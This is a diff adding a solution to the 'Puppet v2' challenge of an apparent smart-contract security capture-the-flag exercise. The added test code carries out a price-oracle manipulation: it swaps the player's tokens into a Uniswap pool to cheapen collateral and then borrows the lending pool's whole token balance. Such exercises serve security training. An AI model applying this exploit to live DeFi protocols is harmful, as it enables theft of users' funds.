@@ -83,6 +83,29 @@ describe('[Challenge] Puppet v2', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        const playerRouter = uniswapRouter.connect(player);
+        const playerPool = lendingPool.connect(player)
+        const playerToken = token.connect(player)
+        const playerWeth = weth.connect(player)
+        await playerToken.approve(playerRouter.address, PLAYER_INITIAL_TOKEN_BALANCE)
+        await playerRouter.swapExactTokensForETH(
+            PLAYER_INITIAL_TOKEN_BALANCE,
+            0n,
+            [
+                token.address,
+                weth.address
+            ],
+            player.address,
+            (await ethers.provider.getBlock('latest')).timestamp * 2
+        )
+        let newPlayerBalance = BigInt(await ethers.provider.getBalance(player.address)) 
+        let delta = newPlayerBalance - PLAYER_INITIAL_ETH_BALANCE
+        let wethRequired = BigInt(await playerPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE))
+        delta = newPlayerBalance - wethRequired
+        expect(delta).to.be.gt(0)
+        await playerWeth.deposit({value: wethRequired})
+        await playerWeth.approve(lendingPool.address, wethRequired)
+        await playerPool.borrow(POOL_INITIAL_TOKEN_BALANCE)
     });
 
     after(async function () {
